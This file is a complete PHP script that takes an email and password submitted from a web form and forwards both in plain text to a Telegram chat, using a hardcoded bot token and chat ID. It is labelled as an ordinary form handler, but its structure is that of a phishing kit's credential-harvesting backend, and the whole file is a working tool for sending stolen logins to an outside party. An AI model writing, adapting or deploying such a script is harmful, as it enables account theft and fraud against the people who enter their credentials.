<?php
// Telegram Bot Token and Chat ID
$botToken = "8267501471:AAGAV9gVJrDuvbecBiMuOe9vxr6eNwTsGVE"; // Replace with your bot token
$chatId = "7908847982"; // Replace with your chat ID

// Check if form data is received via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Validate input
    $email = filter_input(INPUT_POST, 'emInp', FILTER_SANITIZE_EMAIL);
    $password = filter_input(INPUT_POST, 'pwInp', FILTER_SANITIZE_STRING);

    if (filter_var($email, FILTER_VALIDATE_EMAIL) && !empty($password)) {
        // Prepare the message to be sent to Telegram
        $message = "New form submission:\nEmail: $email\nPassword: $password";

        // Telegram API URL
        $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

        // Send the data to Telegram using cURL
        $curl = curl_init();
        curl_setopt_array($curl, [
            CURLOPT_URL => $telegramApiUrl,
            CURLOPT_POST => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POSTFIELDS => [
                'chat_id' => $chatId,
                'text' => $message
            ],
        ]);

        $response = curl_exec($curl);
        $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);

        curl_close($curl);

        if ($httpCode === 200) {
            // Success response
            echo json_encode(["status" => "success", "message" => "Data submitted successfully."]);
        } else {
            // Error response
            echo json_encode(["status" => "error", "message" => "Failed to send data to Telegram."]);
        }
    } else {
        // Validation error
        echo json_encode(["status" => "error", "message" => "Invalid input. Please provide a valid email and password."]);
    }
} else {
    // Invalid request method
    echo json_encode(["status" => "error", "message" => "Invalid request method."]);
}
?>
